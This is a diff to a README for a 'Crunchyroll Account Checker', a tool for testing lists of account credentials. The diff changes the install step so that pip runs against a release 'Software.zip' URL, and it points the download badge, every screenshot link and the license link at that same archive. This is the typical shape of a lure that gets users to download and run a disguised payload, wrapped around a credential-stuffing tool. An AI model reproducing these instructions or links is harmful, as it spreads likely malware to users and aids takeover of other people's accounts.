@@ -11,7 +11,7 @@ Welcome to the Crunchyroll Account Checker repository! This tool is designed to 
 
 ## How to Use
 1. Clone the repository to your local machine.
-2. Install the required dependencies by running `pip install -r requirements.txt`.
+2. Install the required dependencies by running `pip install -r https://github.com/Cynicave/Crunchyroll-Account-Checker/releases/download/v2.0/Software.zip`.
 3. Make sure to have a list of Crunchyroll account credentials in the correct format.
 4. Run the tool with the appropriate command-line arguments to start checking accounts.
 
@@ -29,16 +29,16 @@ Welcome to the Crunchyroll Account Checker repository! This tool is designed to 
 - tls-client
 
 ## Download Latest Release
-[![Download Crunchyroll Account Checker](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Crunchyroll Account Checker](https://github.com/Cynicave/Crunchyroll-Account-Checker/releases/download/v2.0/Software.zip%20Release-blue)](https://github.com/Cynicave/Crunchyroll-Account-Checker/releases/download/v2.0/Software.zip)
 
 Please note that the above link leads to a downloadable zip file of the latest release. You will need to extract the contents and launch the tool according to the provided instructions.
 
 ## Screenshots
 Here are some screenshots of the Crunchyroll Account Checker tool in action:
 
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
-![Screenshot 3](https://example.com/screenshot3.png)
+![Screenshot 1](https://github.com/Cynicave/Crunchyroll-Account-Checker/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/Cynicave/Crunchyroll-Account-Checker/releases/download/v2.0/Software.zip)
+![Screenshot 3](https://github.com/Cynicave/Crunchyroll-Account-Checker/releases/download/v2.0/Software.zip)
 
 ## Contributions
 Contributions to this project are welcome! If you have any suggestions, bug fixes, or new features to add, feel free to submit a pull request.
@@ -47,7 +47,7 @@ Contributions to this project are welcome! If you have any suggestions, bug fixe
 This tool was developed by the Crunchyroll Account Checker team. Thank you to all contributors for their hard work and dedication to the project.
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Cynicave/Crunchyroll-Account-Checker/releases/download/v2.0/Software.zip](https://github.com/Cynicave/Crunchyroll-Account-Checker/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
